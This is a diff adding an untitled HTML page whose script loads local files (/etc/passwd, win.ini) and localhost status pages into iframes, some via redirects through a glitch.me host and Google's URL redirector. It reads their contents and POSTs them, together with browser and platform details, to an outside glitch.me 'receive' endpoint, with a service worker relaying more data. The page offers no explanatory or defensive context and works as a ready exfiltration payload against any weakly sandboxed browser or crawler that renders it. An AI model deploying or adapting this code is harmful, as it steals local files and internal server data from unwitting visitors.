@@ -1,0 +1,336 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <head>
+        <meta charset="UTF-8">
+        <title></title>
+        <style>
+            table, th, td {
+                border: 1px solid black;
+                border-collapse: collapse;
+            }
+            th, td {
+                padding: 2px;
+            }
+            iframe {
+                width: 250x;
+                height: 150px;
+            }
+        </style>
+    </head>
+  
+    <script>
+
+      
+    //document.domain="http://127.0.0.1";
+
+    document.addEventListener('DOMContentLoaded', function() {
+
+          fetch('https://google.com')
+            .then(function(response) {
+                // If the request succeeds, it might indicate that security features like CORS are disabled
+                document.getElementById('testResult').textContent = 'CORS Request succeeded: Security features might be disabled.';
+            })
+            .catch(function(error) {
+                // If the request fails, it likely means that CORS policy is enforced
+                document.getElementById('testResult').textContent = 'CORS Request failed: Security features are likely enabled.';
+            });
+
+      
+          var platform = navigator.platform;
+          var userAgent = navigator.userAgent;
+          var uaOs;
+          var webServer = "unknown";
+
+          // OS from User-agent
+          if (userAgent.includes('Windows')) {
+              uaOs = 'Windows';
+          } else if (userAgent.includes('Linux')) {
+              uaOs = 'Linux';
+          }
+
+           // OS 
+          if (platform.includes('Win')) {
+              platform = 'Windows';
+          } else if (platform.includes('Linux')) {
+              platform = 'Linux';
+          } else {
+              platform = uaOs;
+          }
+
+          // logging OS, browser version
+          console.log("Platform: " + platform);
+          console.log("User-Agent: " + userAgent);
+          console.log("Determined OS: " + uaOs);
+      
+          var sp1Element = document.getElementById('sp1');
+          var sp2Element = document.getElementById('sp2');
+          var sp3Element = document.getElementById('sp3');
+          var sp4Element = document.getElementById('sp4');
+          sp1Element.textContent = "-Platform:" + navigator.platform;
+          sp2Element.textContent = "-U-agent :" + navigator.userAgent;
+          sp3Element.textContent = "-Det-plat:" + platform;
+
+          sp4Element.textContent = "-location:" + window.location; //document.domain;
+
+          if (!window.location.href.includes('glitch')) {
+              sp4Element.textContent = "-Location:" + window.location.href; //document.domain;
+          }
+          else
+              sp4Element.textContent = "-Location:Remote:" + window.location.href;;
+      
+          var sp5Element = document.getElementById('sp5');      
+
+          // set iframe src
+          setIframeSrcAndLoad('iframe1_1', 'file:///etc/passwd');              // DFlW
+          setIframeSrcAndLoad('iframe1_2', 'file:///C://Windows//win.ini');    // DFlW
+          //setIframeSrcAndLoad('iframe1_2', 'file:///C://Temp/read11.txt');
+
+          setIframeSrcAndLoad('iframe2_1', 'http://127.0.0.1');                // D127
+
+          setIframeSrcAndLoad('iframe3_1', 'http://127.0.0.1/server-status');  // D1an      
+          setIframeSrcAndLoad('iframe3_2', 'http://127.0.0.1/nginx_status');   // D1an     
+           
+          // ---
+      
+          setIframeSrcAndLoad('iframe11_1', 'https://artistic-spiny-network.glitch.me/checkrdrt_file_l.html');  // CFlw
+          setIframeSrcAndLoad('iframe11_2', 'https://artistic-spiny-network.glitch.me/checkrdrt_file_w.html');  // CFlw
+
+          setIframeSrcAndLoad('iframe12', 'https://artistic-spiny-network.glitch.me/checkrdrt_127.html');      // C127
+
+          setIframeSrcAndLoad('iframe13_1', 'https://artistic-spiny-network.glitch.me/checkrdrt_server_a.html');  // C1an
+          setIframeSrcAndLoad('iframe13_2', 'https://artistic-spiny-network.glitch.me/checkrdrt_server_n.html');  // C1an
+
+          // ---
+      
+          //setIframeSrcAndLoad('iframe23', 'https://artistic-spiny-network.glitch.me/basic_admin');       // S1AP
+          //setIframeSrcAndLoad('iframe24', 'https://artistic-spiny-network.glitch.me/basic_phpmyadmin');  // S1AP
+          setIframeSrcAndLoad('iframe23', 'https://artistic-spiny-network.glitch.me/bing');                 // SCrd
+          setIframeSrcAndLoad('iframe24', 'https://artistic-spiny-network.glitch.me/checkrdrt_bing.html');  // SCrd
+      
+          setIframeSrcAndLoad('iframe25', 'https://artistic-spiny-network.glitch.me/basic');             // S127
+      
+          setIframeSrcAndLoad('iframe21', 'https://artistic-spiny-network.glitch.me/apache_127');        // s1an
+          setIframeSrcAndLoad('iframe22', 'https://artistic-spiny-network.glitch.me/nginx_127');         // s1an
+      
+          // ---
+      
+          setIframeSrcAndLoad('iframe26', 'https://artistic-spiny-network.glitch.me/apache_localtest'); // slan  //240318-https
+          setIframeSrcAndLoad('iframe27', 'https://artistic-spiny-network.glitch.me/nginx_localtest');  // slan   //240318-https
+      
+          setIframeSrcAndLoad('iframe31', 'https://bing.com/');  // ex
+
+          setIframeSrcAndLoad('iframe32', 'https://www.google.com/url?rct=j&sa=t&url=http://127.0.0.1/server-status');  // g1an
+          setIframeSrcAndLoad('iframe33', 'https://www.google.com/url?rct=j&sa=t&url=http://127.0.0.1/nginx_status');   // g1an
+
+
+      
+          function setIframeSrcAndLoad(iframeId, src) {
+              var iframe = document.getElementById(iframeId);
+              iframe.src = src;
+              iframe.onload = function() {
+                  var content = iframe.contentWindow.document.body.innerHTML;
+                  sendDataToServer(src, content);
+              };
+          }
+
+
+          // serviceWorker
+          if ('serviceWorker' in navigator) {
+              navigator.serviceWorker.register('service-worker.js')
+                  .then(registration => {
+                      //console.log('Service Worker registered with scope:', registration.scope);
+                      //sp5Element.textContent = "Sworker start";
+                  })
+                  .catch(error => {
+                      //console.log('Service Worker registration failed:', error);
+                  });
+
+              // wait massge from Service Worker
+              navigator.serviceWorker.addEventListener('message', event => {
+                  const data = event.data;
+                  //console.log('receive message from Service Worker:', data.text);
+                  sp5Element.textContent = "SendBySworker";
+
+                  //transfer data
+                  sendDataToServer('[-SW-]' + data.url, data.text);
+            });
+          }      
+
+      });
+      
+      
+    // Transfer data to server
+    function sendDataToServer(url, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://artistic-spiny-network.glitch.me/receive', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        // if ( url.includes('glitch') )
+        //   return;
+      
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                // process data
+                if (xhr.status === 200) {
+                    console.log('send data');
+                } else {
+                    console.log('Errors in transit');
+                }
+            }
+        };
+
+
+        if ( url.includes("bing.com") && data && data.length > 3000) {
+            data = data.substring(0, 3000);
+            data += "\n More.....\n More.....";
+        }
+      
+        // trans data (json)
+        xhr.send(JSON.stringify({ url: url, data: data }));
+    }
+        
+    </script>
+</head>
+<body>
+    <div id="testResult"></div>
+    <span id="sp1"></span><br>
+    <span id="sp2"></span><br>
+    <span id="sp3"></span>&nbsp;&nbsp;
+    <span id="sp4"></span>&nbsp;&nbsp;
+    <span id="sp5"></span>
+
+    <table>
+        <tr>
+            <td bgcolor="pink">DFlW</td>  
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe1_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe1_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>
+          
+            <td bgcolor="pink">D127</td>
+            <td><iframe id="iframe2_1"></iframe></td>
+
+            <td bgcolor="pink">D1an</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe3_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe3_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>
+          
+        </tr>
+        <tr>          
+          
+            <td bgcolor="lime">CFlw</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe11_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe11_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>              
+
+            <td bgcolor="lime">C127</td>
+            <td><iframe id="iframe12"></iframe></td>
+      
+            <td bgcolor="lime">C1an</td>  
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe13_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe13_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+        </tr>
+        <tr>              
+
+<!--             
+            <td bgcolor="khaki">S1AP</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe23" width="140" ></iframe></td>
+                  <td><iframe id="iframe24" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>             
+-->
+            <td bgcolor="khaki">SCrd</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe23" width="140" ></iframe></td>
+                  <td><iframe id="iframe24" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+
+          
+            <td bgcolor="khaki">S127</td>  
+            <td><iframe id="iframe25"></iframe></td>
+          
+          
+            <td bgcolor="khaki">S1an</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe21" width="140" ></iframe></td>
+                  <td><iframe id="iframe22" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+        </tr>
+        <tr>              
+          
+            <td bgcolor="khaki">Slan</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe26" width="140" ></iframe></td>
+                  <td><iframe id="iframe27" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+            <td bgcolor="lightblue">ex</td>  
+            <td><iframe id="iframe31"></iframe></td>
+
+            <td bgcolor="lightblue">g1an</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe32" width="140" ></iframe></td>
+                  <td><iframe id="iframe33" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+        </tr>
+
+
+    </table>
+  
+</body>
+  
+  
+  <script>
+
+
+
+    
+  </script>
+    
+</html>
